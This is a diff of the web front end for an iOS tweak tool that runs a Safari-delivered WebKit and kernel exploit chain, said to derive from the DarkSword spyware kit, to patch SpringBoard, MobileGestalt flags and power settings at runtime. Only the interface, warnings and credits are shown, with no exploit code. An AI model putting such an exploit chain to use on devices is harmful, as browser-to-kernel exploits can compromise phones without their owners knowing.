+      text-align: right;
+    }
+    .tweak-sheet-body {
+      padding: 16px 18px 20px;
+    }
+    .tweak-sheet-body .tweak-row-desc {
+      font-size: 0.78rem;
+      color: var(--muted);
+      line-height: 1.6;
+      margin-bottom: 14px;
+    }
+    .tweak-sheet-body .tweak-row-notes {
+      font-size: 0.72rem;
+      color: var(--subtle);
+      line-height: 1.55;
+      margin-bottom: 14px;
+    }
+    .tweak-sheet-body .tweak-row-options {
+      display: block !important;
+      margin-top: 0;
+      padding-top: 0;
+      border-top: none;
+    }
+    .tweak-sheet-body .tweak-row-desc-inline { display: none; }
+    .tweak-sheet-body .tweak-row-detail { border-top: none; margin-top: 0; padding-top: 0; padding-left: 0; }
+    .tweak-sheet-body .sbc-list {
+      border-radius: 12px;
+    }
+    .tweak-sheet-body .sbc-row {
+      padding: 10px 14px;
+    }
+    .tweak-sheet-body .tweak-row-options-label {
+      margin-top: 14px;
+    }
+    .tweak-sheet-body select {
+      margin-bottom: 4px;
     }
     .tweak-row-badge {
       display: inline-block;
@@ -690,7 +1245,7 @@
       align-items: center;
       justify-content: space-between;
       gap: 12px;
-      min-height: 34px;
+      min-height: 28px;
     }
     .tweak-row-title {
       flex: 1;
@@ -713,8 +1268,14 @@
       outline-offset: 3px;
       border-radius: 4px;
     }
+    .tweak-row-info {
+      display: none;
+    }
+    .tweak-row-head {
+      cursor: pointer;
+    }
     .tweak-row-caret {
-      display: inline-flex;
+      display: none;
       align-items: center;
       justify-content: center;
       width: 14px;
@@ -736,6 +1297,14 @@
       color: var(--ink);
       line-height: 1.3;
       letter-spacing: -0.01em;
+    }
+    .tweak-row-hint {
+      display: block;
+      font-size: 0.68rem;
+      font-weight: 400;
+      color: var(--faint);
+      margin-top: 1px;
+      letter-spacing: 0;
     }
     .tweak-row-detail {
       margin-top: 10px;
@@ -760,68 +1329,47 @@
     .tweak-row.expanded .tweak-row-desc-inline {
       display: none;
     }
-    /* iOS-style toggle switch */
-    .tweak-toggle {
-      position: relative;
-      display: inline-block;
-      width: 51px;
-      height: 31px;
-      flex-shrink: 0;
-      -webkit-tap-highlight-color: transparent;
-    }
-    .tweak-toggle input {
-      position: absolute;
-      inset: 0;
-      width: 100%;
-      height: 100%;
-      margin: 0;
-      opacity: 0;
+    /* Sileo-style queue button */
+    .tweak-queue-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 6px 16px;
+      border-radius: 999px;
+      border: none;
+      font-family: inherit;
+      font-size: 0.78rem;
+      font-weight: 600;
       cursor: pointer;
-      z-index: 1;
-    }
-    .tweak-toggle-track {
-      position: absolute;
-      inset: 0;
-      background: var(--card-inset);
-      border: 1px solid var(--border-soft);
-      border-radius: 31px;
-      transition: background 0.22s var(--ease), border-color 0.22s var(--ease);
-    }
-    .tweak-toggle-track::before {
-      content: '';
-      position: absolute;
-      left: 2px;
-      top: 2px;
-      width: 25px;
-      height: 25px;
-      background: var(--card);
-      border-radius: 50%;
-      box-shadow: 0 2px 6px rgba(15,23,42,0.18), 0 1px 1px rgba(15,23,42,0.12);
-      transition: transform 0.22s var(--ease);
-    }
-    .tweak-toggle input:checked ~ .tweak-toggle-track {
+      flex-shrink: 0;
+      transition: background 0.18s var(--ease), color 0.18s var(--ease), transform 0.12s var(--ease-out);
+      -webkit-tap-highlight-color: transparent;
       background: var(--accent);
-      border-color: var(--accent-hover);
+      color: #fff;
+      letter-spacing: -0.005em;
     }
-    .tweak-toggle input:checked ~ .tweak-toggle-track::before { transform: translateX(20px); background: #fff; }
-    .tweak-toggle input:focus-visible ~ .tweak-toggle-track {
-      box-shadow: var(--ring);
-    }
-    .tweak-row.experimental .tweak-toggle-track {
+    .tweak-queue-btn:active { transform: scale(0.95); }
+    .tweak-queue-btn.queued {
       background: var(--card-inset);
+      color: var(--muted);
+      border: 1px solid var(--border);
     }
+    /* Hidden checkbox drives the queued state (only top-level row toggles) */
+    .tweak-row-head > .tweak-toggle { display: none; }
+    /* Sub-option toggles inside sheets keep their styling */
+    .tweak-sheet-body .tweak-toggle,
+    .tweak-row-options .tweak-toggle { display: inline-block; }
     @media (prefers-reduced-motion: reduce) {
-      .tweak-row-caret,
-      .tweak-toggle-track,
-      .tweak-toggle-track::before { transition: none; }
+      .tweak-queue-btn { transition: none; }
     }
     .tweak-row-options {
       display: none;
-      margin-top: 10px;
-      padding-top: 10px;
+      margin-top: 6px;
+      padding-top: 6px;
       border-top: 1px solid var(--border-soft);
     }
-    .tweak-row.checked .tweak-row-options { display: block; }
+    /* Options only visible inside the sheet panel, never inline */
+    .tweak-row.checked .tweak-row-options { display: none; }
     .tweak-row-options-label {
       font-family: var(--mono);
       font-size: 0.64rem;
@@ -869,13 +1417,9 @@
       display: flex;
       align-items: center;
       justify-content: space-between;
-      padding: 11px 14px;
+      padding: 8px 12px;
       border-bottom: 1px solid var(--border-soft);
-      gap: 12px;
-    }
-    .sbc-row.in-development {
-      background: #fff8ee;
-      opacity: 0.76;
+      gap: 10px;
     }
     .sbc-row:last-child { border-bottom: none; }
     .sbc-row-meta { min-width: 0; flex: 1; }
@@ -955,6 +1499,39 @@
     .sbc-slider:focus-visible::-webkit-slider-thumb {
       box-shadow: 0 1px 4px rgba(10,15,28,0.22), 0 0 0 4px rgba(45,169,255,0.35);
     }
+    .sbc-slider-wrap {
+      position: relative;
+    }
+    .sbc-slider-ticks {
+      display: flex;
+      justify-content: space-between;
+      padding: 0 12px;
+      margin-top: -2px;
+      pointer-events: none;
+      user-select: none;
+      -webkit-user-select: none;
+    }
+    .sbc-slider-ticks span {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 2px;
+    }
+    .sbc-slider-ticks span::before {
+      content: '';
+      display: block;
+      width: 1px;
+      height: 6px;
+      background: var(--border);
+      border-radius: 1px;
+    }
+    .sbc-slider-ticks span::after {
+      content: attr(data-v);
+      font-family: var(--mono);
+      font-size: 0.55rem;
+      color: var(--faint);
+      font-weight: 500;
+    }
     .sbc-reset-row {
       display: flex;
       justify-content: center;
@@ -998,8 +1575,8 @@
       line-height: 1.3;
     }
     .sbc-wip-note {
-      margin-top: 8px;
-      padding: 10px 12px;
+      margin-top: 6px;
+      padding: 8px 10px;
       background: #fff3df;
       border: 1px solid #ffae40;
       border-radius: 10px;
@@ -1019,12 +1596,9 @@
   </style>
 </head>
 <body>
-  <div class="build-warning-banner">
-    <time id="buildTimestamp" datetime="2026-05-01T01:45:43-04:00">2026-05-01 01:45 EDT</time>
-  </div>
   <div class="page">
     <div class="page-header">
-      <div class="page-title">BrokenBlade</div>
+      <div class="page-title">LightSaber</div>
       <div class="page-subtitle">iOS research tool(s)? 👀</div>
       <div class="page-author">
         <a href="https://twitter.com/zeroxjf" target="_blank" rel="noopener" title="Follow @zeroxjf on X / Twitter">
@@ -1033,7 +1607,7 @@
         </a>
       </div>
       <div class="header-cards">
-        <a class="header-card" href="https://github.com/zeroxjf/BrokenBlade" target="_blank" rel="noopener" title="View BrokenBlade source on GitHub">
+        <a class="header-card" href="https://github.com/zeroxjf/LightSaber" target="_blank" rel="noopener" title="View lightsaber source on GitHub">
           <svg height="14" width="14" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
           <span>Open source on GitHub</span>
         </a>
@@ -1053,30 +1627,22 @@
     </div>
 
     <div class="section">
-      <div class="section-title">Install "tweaks"</div>
-      <p class="section-desc">Pick one or more. Selected payloads run together in a single chain execution.</p>
-      <div class="info">
-        <strong>Supported:</strong> every arm64e iPhone (A12 &ndash; A18 Pro) running iOS 18.4 &ndash; 18.6.2.
-      </div>
-      <p id="supportMsg" style="font-size:13px;margin-bottom:6px"></p>
+      <p id="supportMsg" style="font-size:0.78rem;margin-bottom:4px"></p>
+      <p style="font-size:0.7rem;color:var(--faint);margin-bottom:10px">iPhone &middot; iOS 18.4&ndash;18.6.2</p>
 
       <div class="tweak-list">
+        <div class="tweak-section-label">SpringBoard</div>
         <div class="tweak-row" id="tweakRowFiveicon">
           <div class="tweak-row-head">
-            <button type="button" class="tweak-row-title" aria-expanded="false" aria-controls="tweakDetailFiveicon">
-              <span class="tweak-row-caret" aria-hidden="true">&rsaquo;</span>
-              <span class="tweak-row-name">SBCustomizer</span>
-            </button>
-            <label class="tweak-toggle" aria-label="Enable SBCustomizer">
-              <input type="checkbox" id="tweakFiveicon">
-              <span class="tweak-toggle-track" aria-hidden="true"></span>
-            </label>
+            <span class="tweak-row-name">SBCustomizer<span class="tweak-row-hint">tap for options</span></span>
+            <button type="button" class="tweak-row-info" aria-label="SBCustomizer details" data-sheet="tweakRowFiveicon">i</button>
+            <input type="checkbox" id="tweakFiveicon" class="tweak-toggle">
+            <button type="button" class="tweak-queue-btn" data-cb="tweakFiveicon">GET</button>
           </div>
           <div class="tweak-row-detail" id="tweakDetailFiveicon" hidden>
             <div class="tweak-row-desc">Fine-tune the SpringBoard dock and home screen grid at runtime: number of icons in the dock, home columns, and home rows. Runtime patch only &mdash; no on-disk changes.</div>
             <div class="tweak-row-notes">
-              <strong>Persistence:</strong> lives only inside SpringBoard, so it clears on respring/reboot.<br>
-              <strong>Going wide:</strong> pushing home columns or rows well above stock can cause icons to clip. If something looks wrong after install, respring.
+              <strong>Persistence:</strong> lives only inside SpringBoard, so it clears on respring/reboot.
             </div>
           </div>
           <div class="tweak-row-options">
@@ -1086,21 +1652,30 @@
                   <span class="sbc-row-label">Dock icons</span>
                   <span class="sbc-slider-value" id="sbcDockIconsVal">4</span>
                 </div>
-                <input type="range" id="sbcDockIcons" class="sbc-slider" min="4" max="7" step="1" value="4" aria-label="Dock icons">
+                <div class="sbc-slider-wrap">
+                  <input type="range" id="sbcDockIcons" class="sbc-slider" min="4" max="7" step="1" value="4" aria-label="Dock icons">
+                  <div class="sbc-slider-ticks"><span data-v="4"></span><span data-v="5"></span><span data-v="6"></span><span data-v="7"></span></div>
+                </div>
               </div>
               <div class="sbc-row sbc-row-slider">
                 <div class="sbc-slider-head">
                   <span class="sbc-row-label">Home columns</span>
                   <span class="sbc-slider-value" id="sbcHsColsVal">4</span>
                 </div>
-                <input type="range" id="sbcHsCols" class="sbc-slider" min="3" max="7" step="1" value="4" aria-label="Home columns">
+                <div class="sbc-slider-wrap">
+                  <input type="range" id="sbcHsCols" class="sbc-slider" min="3" max="7" step="1" value="4" aria-label="Home columns">
+                  <div class="sbc-slider-ticks"><span data-v="3"></span><span data-v="4"></span><span data-v="5"></span><span data-v="6"></span><span data-v="7"></span></div>
+                </div>
               </div>
               <div class="sbc-row sbc-row-slider">
                 <div class="sbc-slider-head">
                   <span class="sbc-row-label">Home rows</span>
                   <span class="sbc-slider-value" id="sbcHsRowsVal">6</span>
                 </div>
-                <input type="range" id="sbcHsRows" class="sbc-slider" min="4" max="8" step="1" value="6" aria-label="Home rows">
+                <div class="sbc-slider-wrap">
+                  <input type="range" id="sbcHsRows" class="sbc-slider" min="4" max="8" step="1" value="6" aria-label="Home rows">
+                  <div class="sbc-slider-ticks"><span data-v="4"></span><span data-v="5"></span><span data-v="6"></span><span data-v="7"></span><span data-v="8"></span></div>
+                </div>
               </div>
               <div class="sbc-row">
                 <div class="sbc-row-meta">
@@ -1109,19 +1684,6 @@
                 </div>
                 <label class="tweak-toggle" aria-label="Hide icon labels">
                   <input type="checkbox" id="sbcHideLabels">
-                  <span class="tweak-toggle-track" aria-hidden="true"></span>
-                </label>
-              </div>
-              <div class="sbc-row in-development">
-                <div class="sbc-row-meta">
-                  <div class="sbc-row-label-wrap">
-                    <div class="sbc-row-label">StatBar</div>
-                    <span class="sbc-row-badge">in development</span>
-                  </div>
-                  <div class="sbc-row-sub">Experimental status bar metrics overlay</div>
-                </div>
-                <label class="tweak-toggle" aria-label="Enable StatBar">
-                  <input type="checkbox" id="sbcStatbar">
                   <span class="tweak-toggle-track" aria-hidden="true"></span>
                 </label>
               </div>
@@ -1135,16 +1697,40 @@
           </div>
         </div>
 
+        <div class="tweak-section-label">System</div>
+        <div class="tweak-row" id="tweakRowMgpatcher">
+          <div class="tweak-row-head">
+            <span class="tweak-row-name">MobileGestalt Patcher<span class="tweak-row-hint">tap for options</span></span>
+            <button type="button" class="tweak-row-info" aria-label="MobileGestalt Patcher details" data-sheet="tweakRowMgpatcher">i</button>
+            <input type="checkbox" id="tweakMgpatcher" class="tweak-toggle">
+            <button type="button" class="tweak-queue-btn" data-cb="tweakMgpatcher">GET</button>
+          </div>
+          <div class="tweak-row-detail" id="tweakDetailMgpatcher" hidden>
+          </div>
+          <div class="tweak-row-options">
+            <div style="margin-bottom:8px;padding:8px 10px;background:#fff0f0;border:1px solid #f87171;border-radius:8px;font-size:0.7rem;color:#7f1d1d;line-height:1.55"><strong>Warning:</strong> Enabling features your hardware does not support may cause UI glitches, crashes, or in rare cases a bootloop requiring a restore. Only enable features you understand. Uncheck to revert. Use at your own risk.</div>
+            <div class="sbc-list">
+              <label class="sbc-row"><div class="sbc-row-meta"><div class="sbc-row-label">Boot Chime</div><div class="sbc-row-sub">Startup sound on boot</div></div><input type="checkbox" id="mgBootChime"></label>
+              <label class="sbc-row"><div class="sbc-row-meta"><div class="sbc-row-label">Charge Limit</div><div class="sbc-row-sub">Battery charge limiting setting</div></div><input type="checkbox" id="mgChargeLimit"></label>
+              <label class="sbc-row"><div class="sbc-row-meta"><div class="sbc-row-label">Tap to Wake</div><div class="sbc-row-sub">For iPhone SE models</div></div><input type="checkbox" id="mgTapToWake"></label>
+              <label class="sbc-row"><div class="sbc-row-meta"><div class="sbc-row-label">Collision SOS</div><div class="sbc-row-sub">Crash detection for emergency SOS</div></div><input type="checkbox" id="mgCollisionSOS"></label>
+              <label class="sbc-row"><div class="sbc-row-meta"><div class="sbc-row-label">Apple Pencil</div><div class="sbc-row-sub">Pencil settings tab</div></div><input type="checkbox" id="mgPencil"></label>
+              <label class="sbc-row"><div class="sbc-row-meta"><div class="sbc-row-label">Action Button</div><div class="sbc-row-sub">Action Button settings tab</div></div><input type="checkbox" id="mgActionButton"></label>
+              <label class="sbc-row"><div class="sbc-row-meta"><div class="sbc-row-label">Always On Display</div><div class="sbc-row-sub">Lock screen stays visible</div><div class="sbc-row-sub" style="color:#b91c1c">May cause burn-in on unsupported displays</div></div><input type="checkbox" id="mgAOD"></label>
+              <label class="sbc-row"><div class="sbc-row-meta"><div class="sbc-row-label">Stage Manager</div><div class="sbc-row-sub">Multitasking windowing</div></div><input type="checkbox" id="mgStageManager"></label>
+              <label class="sbc-row"><div class="sbc-row-meta"><div class="sbc-row-label">Internal Install</div><div class="sbc-row-sub">Apple internal flag (Metal HUD, etc.)</div><div class="sbc-row-sub" style="color:#b91c1c">Risky for some devices, mainly iPads</div></div><input type="checkbox" id="mgInternalInstall"></label>
+              <label class="sbc-row"><div class="sbc-row-meta"><div class="sbc-row-label">SRD Mode</div><div class="sbc-row-sub">Security Research Device</div><div class="sbc-row-sub" style="color:#b91c1c">Changes lock screen text to "Security Research Device"</div></div><input type="checkbox" id="mgSRD"></label>
+              <label class="sbc-row"><div class="sbc-row-meta"><div class="sbc-row-label">Disable Shutter Sound</div><div class="sbc-row-sub">Remove regional camera shutter restriction</div></div><input type="checkbox" id="mgShutter"></label>
+              <label class="sbc-row"><div class="sbc-row-meta"><div class="sbc-row-label">iPad Apps on iPhone</div><div class="sbc-row-sub">Allow iPad-only apps to install</div></div><input type="checkbox" id="mgiPadApps"></label>
+            </div>
+          </div>
+        </div>
+
         <div class="tweak-row" id="tweakRowPowercuff">
           <div class="tweak-row-head">
-            <button type="button" class="tweak-row-title" aria-expanded="false" aria-controls="tweakDetailPowercuff">
-              <span class="tweak-row-caret" aria-hidden="true">&rsaquo;</span>
-              <span class="tweak-row-name">Powercuff &mdash; battery saver</span>
-            </button>
-            <label class="tweak-toggle" aria-label="Enable Powercuff">
-              <input type="checkbox" id="tweakPowercuff">
-              <span class="tweak-toggle-track" aria-hidden="true"></span>
-            </label>
+            <span class="tweak-row-name">Powercuff<span class="tweak-row-hint">tap for options</span></span>
+            <input type="checkbox" id="tweakPowercuff" class="tweak-toggle">
+            <button type="button" class="tweak-queue-btn" data-cb="tweakPowercuff">GET</button>
           </div>
           <div class="tweak-row-detail" id="tweakDetailPowercuff" hidden>
             <div class="tweak-row-desc">Underclocks the CPU/GPU for longer battery, at the cost of speed. Port of <a href="https://github.com/rpetrich/Powercuff">rpetrich's Powercuff</a>. Lasts until reboot.</div>
@@ -1154,58 +1740,99 @@
             <span class="tweak-row-options-label">Level</span>
             <select id="powercuffLevel">
               <option value="off">Off</option>
-              <option value="nominal">Nominal</option>
+              <option value="nominal" selected>Nominal</option>
               <option value="light">Light</option>
               <option value="moderate">Moderate</option>
-              <option value="heavy" selected>Heavy</option>
+              <option value="heavy">Heavy</option>
             </select>
           </div>
         </div>
 
-        <div class="tweak-row" id="tweakRowThreeapp">
+        <div class="tweak-section-label">Sideloading</div>
+        <div class="tweak-row is-disabled" id="tweakRowApplimit" aria-disabled="true">
           <div class="tweak-row-head">
-            <button type="button" class="tweak-row-title" aria-expanded="false" aria-controls="tweakDetailThreeapp">
-              <span class="tweak-row-caret" aria-hidden="true">&rsaquo;</span>
-              <span class="tweak-row-name">3-App Bypass</span>
-            </button>
-            <label class="tweak-toggle" aria-label="Enable 3-App Bypass">
-              <input type="checkbox" id="tweakThreeapp">
-              <span class="tweak-toggle-track" aria-hidden="true"></span>
-            </label>
+            <span class="tweak-row-name">3-App Limit Bypass<span class="tweak-row-hint">in development</span></span>
+            <button type="button" class="tweak-row-info" aria-label="3-App Limit Bypass details" data-sheet="tweakRowApplimit">i</button>
+            <input type="checkbox" id="tweakApplimit" class="tweak-toggle" disabled>
+            <button type="button" class="tweak-queue-btn" data-cb="tweakApplimit" disabled>DEV</button>
           </div>
-          <div class="tweak-row-detail" id="tweakDetailThreeapp" hidden>
-            <div class="tweak-row-desc">Clears the free developer profile app-limit marker and audits every app bundle for APFS ownership repair. Re-run after installing or updating sideloaded apps.</div>
+          <div class="tweak-row-detail" id="tweakDetailApplimit">
+            <div class="tweak-row-desc">In development for lightsaber. Use <a href="https://github.com/rooootdev/lara" target="_blank" rel="noopener noreferrer">rooootdev's Lara</a> for 3-App Limit Bypass right now.</div>
           </div>
           <div class="tweak-row-options">
-            <div class="tweak-row-desc tweak-row-desc-inline">Clears the free developer profile app-limit marker and audits every app bundle for APFS ownership repair. Re-run after installing or updating sideloaded apps.</div>
-            <div class="tweak-row-notes"><strong>Note:</strong> A respring may be needed before SpringBoard reflects the updated app state.</div>
+            <div class="tweak-row-desc tweak-row-desc-inline">In development for lightsaber. Use <a href="https://github.com/rooootdev/lara" target="_blank" rel="noopener noreferrer">rooootdev's Lara</a> for 3-App Limit Bypass right now.</div>
+            <div style="margin-bottom:10px;padding:10px 12px;background:#fff8e6;border:1px solid #f5c26b;border-radius:10px;font-size:0.7rem;color:#7a4a05;line-height:1.55"><strong>Note:</strong> A respring may be needed before SpringBoard reflects the updated app state.</div>
           </div>
         </div>
 
       </div>
 
       <div class="install-zone">
-        <button id="runBtn" class="btn btn-run" onclick="confirmInstall()">Install Selected</button>
+        <button id="runBtn" class="btn btn-run" onclick="confirmInstall()">Install Queue</button>
+        <div class="install-secondary-actions">
+          <button type="button" class="btn btn-respring" id="respringBtn" onclick="runRespring()">Respring</button>
+          <button type="button" class="btn-clear-queue" id="clearQueueBtn">Clear queue</button>
+        </div>
       </div>
       <div id="installStatus" class="install-status"></div>
-      <div id="logBox" aria-live="polite">
-        <div class="log-header">
-          <span>WebContent Process Log</span>
-          <span class="log-actions">
-            <button type="button" class="log-action" onclick="clearLogView()">Clear</button>
-            <button type="button" class="log-action" onclick="hideLogView()">Hide</button>
-          </span>
+      <div class="run-expectations" id="runExpectations">
+        <div class="run-expectations-title">What to expect when you press Install</div>
+        <div class="expectation-list">
+          <div class="expectation-row" data-expectation="1">
+            <span class="expectation-badge">1</span>
+            <span class="expectation-copy"><strong>The page will freeze.</strong> That is the WebKit handoff to native code. Don&rsquo;t switch apps or lock the phone.</span>
+          </div>
+          <div class="expectation-row" data-expectation="2">
+            <span class="expectation-badge">2</span>
+            <span class="expectation-copy"><strong>The freeze lasts about 45&ndash;60 seconds.</strong> No UI progress while WebKit is paused &mdash; that is normal.</span>
+          </div>
+          <div class="expectation-row" data-expectation="3">
+            <span class="expectation-badge">3</span>
+            <span class="expectation-copy"><strong>Safari will crash to the home screen after the freeze.</strong> That is the good signal &mdash; tweaks are about to install.</span>
+          </div>
+          <div class="expectation-row" data-expectation="4">
+            <span class="expectation-badge">4</span>
+            <span class="expectation-copy"><strong>Just wait 10&ndash;20 seconds after the crash.</strong> Then check the home screen for the tweak you installed.</span>
+          </div>
         </div>
-        <div id="logScroll"></div>
       </div>
-      <div class="tip">
-        <div class="tip-icon">i</div>
-        <div class="tip-body">
-          <strong>Tip:</strong> takes up to 60 seconds. Keep Safari in the foreground while it runs &mdash; don't switch apps or lock the device. If it works, don't press your luck.<br><br>
-          <strong>If it fails</strong> (page flash, "A problem repeatedly occurred", or "webpage crashed" banner): your best bet is to clear Safari's cache and retry &mdash; not just kill Safari. Tap the book icon in Safari's bottom tab bar, then Clear, then reload this page. If it still fails after a couple of tries, reboot the device, clear the cache again, and try once more.
+      <div class="log-sheet" id="logSheet" aria-live="polite">
+        <div class="log-sheet-header">
+          <span class="log-sheet-title">WebContent Log</span>
+          <button type="button" class="log-sheet-clear" onclick="clearRawLogView()">Clear</button>
+        </div>
+        <div class="log-stage-banner" id="logStageBanner">
+          <div class="log-stage-text" id="logStageText">Waiting to start</div>
+          <div class="log-stage-sub" id="logStageSub"></div>
+        </div>
+        <div class="log-phase-strip" id="logPhaseStrip" aria-hidden="true">
+          <div class="log-phase" data-phase="1"><div class="log-phase-bar"></div><div class="log-phase-label">Setup</div></div>
+          <div class="log-phase" data-phase="2"><div class="log-phase-bar"></div><div class="log-phase-label">WebKit</div></div>
+          <div class="log-phase" data-phase="3"><div class="log-phase-bar"></div><div class="log-phase-label">Kernel</div></div>
+          <div class="log-phase" data-phase="4"><div class="log-phase-bar"></div><div class="log-phase-label">Cleanup</div></div>
+          <div class="log-phase" data-phase="5"><div class="log-phase-bar"></div><div class="log-phase-label">Apply</div></div>
+          <span class="frozen-bracket frozen-bracket-l" aria-hidden="true"></span>
+          <span class="frozen-bracket frozen-bracket-r" aria-hidden="true"></span>
+        </div>
+        <div class="log-phase-frozen-note" id="logPhaseFrozenNote" aria-live="polite">
+          Phases 3&ndash;5 run while WebKit is frozen &mdash; no live log updates here.
+        </div>
+        <div class="log-expected-callout" id="logExpectedCallout" role="status" aria-live="polite">
+          <span class="callout-badge">Expected</span>
+          <span class="callout-text" id="logExpectedCalloutText"></span>
+        </div>
+        <div id="rawLogScroll">
+          <div class="raw-log-empty" id="rawLogEmpty">WebContent log lines will appear here when a run starts.</div>
         </div>
       </div>
     </div>
+
+    <details class="debug">
+      <summary><strong>Extra debugging</strong> &mdash; capture device logs from a Mac</summary>
+      <div class="details-body">
+        Requires <a href="https://brew.sh" target="_blank" rel="noopener">Homebrew</a> + <code>brew install libimobiledevice</code> (provides <code>idevicesyslog</code>) and Python 3 (preinstalled on macOS). Download <a href="./syslog.py" download="syslog.py">syslog.py</a> (<a href="https://github.com/zeroxjf/LightSaber/blob/main/syslog.py" target="_blank" rel="noopener">source</a>), connect and trust your iPhone, then run <code>python3 syslog.py</code> from Terminal. Press <code>Ctrl+C</code> after a run; the filtered log is saved under <code>lightsaber-logs/</code>.
+      </div>
+    </details>
 
     <details class="disclaimer">
       <summary><strong>Not tweak injection</strong> &mdash; runtime JS modification only</summary>
@@ -1224,22 +1851,36 @@
     <details class="warning">
       <summary><strong>Use caution</strong> &mdash; unstable, not for daily drivers</summary>
       <div class="details-body">
-        Derived from the <a href="https://iverify.io/blog/darksword-ios-exploit-kit-explained">DarkSword</a> exploit chain with all malware communication stripped and <a href="https://github.com/zeroxjf/BrokenBlade">fully open source</a>, but this is an inherently unstable chain and is <strong>not recommended for deployment on a daily driver</strong> unless you are willing to accept the risk. The chain may take several tries to succeed, SpringBoard may crash, the kernel may panic. Use at your own risk &mdash; I am not liable for any damage or data loss.
+        Derived from the <a href="https://iverify.io/blog/darksword-ios-exploit-kit-explained">DarkSword</a> exploit chain with all malware communication stripped and <a href="https://github.com/zeroxjf/LightSaber">fully open source</a>, but this is an inherently unstable chain and is <strong>not recommended for deployment on a daily driver</strong> unless you are willing to accept the risk. The chain may take several tries to succeed, SpringBoard may crash, the kernel may panic. Use at your own risk &mdash; I am not liable for any damage or data loss.
       </div>
     </details>
 
-    <div class="info" style="margin-top:4px">
-      <strong>Thanks to</strong><br>
-      <a href="https://github.com/34306">34306</a> &amp; <a href="https://github.com/khanhduytran0">khanhduytran0</a>, whose <a href="http://34306.lol/darksword/">site design</a> helped stabilize payload delivery on this project, <a href="https://twitter.com/cro4js" target="_blank" rel="noopener">@cro4js</a> for UI suggestions, and anonymous contributors for help stabilizing the exploit chain.
+    <div style="margin-top:8px;font-size:0.72rem;color:var(--subtle);line-height:1.7">
+      <div style="font-family:var(--mono);font-size:0.6rem;font-weight:600;color:var(--faint);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:6px">Credits</div>
+      <a href="https://iverify.io/blog/darksword-ios-exploit-kit-explained">iVerify</a> &amp; <a href="https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain">Google GTIG</a> &mdash; DarkSword chain documentation<br>
+      <a href="https://github.com/leminlimez/Nugget">leminlimez</a> &mdash; Nugget (MobileGestalt + BookRestore)<br>
+      <a href="https://github.com/khanhduytran0/SparseBox">khanhduytran0</a> &mdash; SparseBox (3-app limit bypass)<br>
+      <a href="https://github.com/rpetrich/Powercuff">rpetrich</a> &mdash; Powercuff tweak<br>
+      <a href="https://github.com/34306">34306</a> &amp; <a href="https://github.com/khanhduytran0">khanhduytran0</a> &mdash; <a href="http://34306.lol/darksword/">site design</a> reference<br>
+      <a href="https://twitter.com/cro4js" target="_blank" rel="noopener">@cro4js</a> &mdash; UI suggestions
     </div>
 
-    <p class="version" id="versionMarker">v0.0.100</p>
+    <p class="version">v0.0.130</p>
+  </div>
+
+  <div class="tweak-sheet-backdrop" id="tweakSheetBackdrop"></div>
+  <div class="tweak-sheet" id="tweakSheet">
+    <div class="tweak-sheet-header">
+      <button type="button" class="tweak-sheet-back" id="tweakSheetBack">&lsaquo; Back</button>
+      <span class="tweak-sheet-title" id="tweakSheetTitle"></span>
+    </div>
+    <div class="tweak-sheet-body" id="tweakSheetBody"></div>
   </div>
 
   <div id="introOverlay" class="overlay">
     <div class="dialog intro">
       <h2>Before you continue</h2>
-      <p class="intro-sub">Please read the following before using BrokenBlade.</p>
+      <p class="intro-sub">Please read the following before using LightSaber.</p>
       <div class="disclaimer">
         <strong>This is not tweak injection.</strong> This is JavaScript injection during the exploit chain that modifies processes at runtime. While changes persist until respring or reboot, this is not a standard dylib injection found with a full jailbreak &mdash; it is limited in nature and only some things can be done with it.
       </div>
@@ -1247,7 +1888,7 @@
         <strong>Compatibility warning.</strong> This may cause compatibility issues with modifications made by <a href="https://github.com/leminlimez/Nugget" target="_blank" rel="noopener">Nugget</a> and other similar tools. While I will work on resolving this, keep this in mind in the interim.
       </div>
       <div class="warning">
-        <strong>Use caution.</strong> Derived from the <a href="https://iverify.io/blog/darksword-ios-exploit-kit-explained">DarkSword</a> exploit chain with all malware communication stripped and <a href="https://github.com/zeroxjf/BrokenBlade">fully open source</a>, but this is an inherently unstable chain and is <strong>not recommended for deployment on a daily driver</strong> unless you are willing to accept the risk. The chain may take several tries to succeed, SpringBoard may crash, the kernel may panic. Use at your own risk &mdash; I am not liable for any damage or data loss.
+        <strong>Use caution.</strong> Derived from the <a href="https://iverify.io/blog/darksword-ios-exploit-kit-explained">DarkSword</a> exploit chain with all malware communication stripped and <a href="https://github.com/zeroxjf/LightSaber">fully open source</a>, but this is an inherently unstable chain and is <strong>not recommended for deployment on a daily driver</strong> unless you are willing to accept the risk. The chain may take several tries to succeed, SpringBoard may crash, the kernel may panic. Use at your own risk &mdash; I am not liable for any damage or data loss.
       </div>
       <div class="dialog-btns">
         <button class="btn-confirm" onclick="dismissIntro()">I understand</button>
@@ -1257,8 +1898,15 @@
 
   <div id="confirmOverlay" class="overlay">
     <div class="dialog">
-      <h2>Are you sure?</h2>
-      <p>This will execute kernel-level exploits on your device. Crashes, resprings, and panics are expected. Exercise extreme caution if using on a personal device.</p>
+      <h2>Before it runs</h2>
+      <p>After you press Proceed, keep Safari open and do not lock the phone. The full run usually takes about 1 minute, approximately.</p>
+      <div class="run-expectations" style="margin-top:12px;text-align:left">
+        <div class="expectation-list">
+          <div class="expectation-row"><span class="expectation-badge">✓</span><span class="expectation-copy"><strong>Page freezes for ~45&ndash;60s:</strong> WebKit handoff &mdash; no UI updates after that.</span></div>
